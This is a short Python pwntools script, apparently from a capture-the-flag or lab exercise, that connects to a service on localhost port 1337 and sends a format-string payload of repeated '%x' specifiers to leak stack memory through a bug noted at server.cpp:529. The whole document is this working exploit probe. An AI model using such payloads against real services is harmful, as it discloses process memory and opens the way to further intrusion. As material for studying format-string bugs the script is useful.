# Controlled format string for unknown commands.
# server.cpp:529
from pwn import *
context(arch = 'amd64', os = 'linux')

r = remote('localhost', 1337)

r.recv(4096)
r.sendline("AAAAAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x")
print(r.recv(4096))